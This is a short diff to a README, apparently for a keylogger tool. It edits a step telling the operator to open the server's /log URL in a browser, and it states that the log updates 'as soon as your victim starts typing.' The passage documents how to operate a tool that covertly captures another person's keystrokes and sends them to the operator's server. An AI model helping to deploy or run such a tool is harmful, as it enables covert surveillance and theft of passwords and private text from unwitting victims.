@@ -6,7 +6,7 @@
 5) Accessing the Logs:
 To view the logs collected by the server, follow these steps:
 Open a Web Browser: Launch your preferred web browser (e.g., Chrome, Firefox, Safari).
-Visit the URL: Enter the following URL in the address bar: http://<host ip>:<port>/log
+Visit the URL: Enter the following URL in the address bar: "http://<hostIP>:<port>/log"
 As soon as your victim starts typing your log file on your server will be updated. (if not refresh the page)
 ----------------------------------------------------------------------------------------------------------------
 In the server.py file, you can change the port number to your desired value. For example:
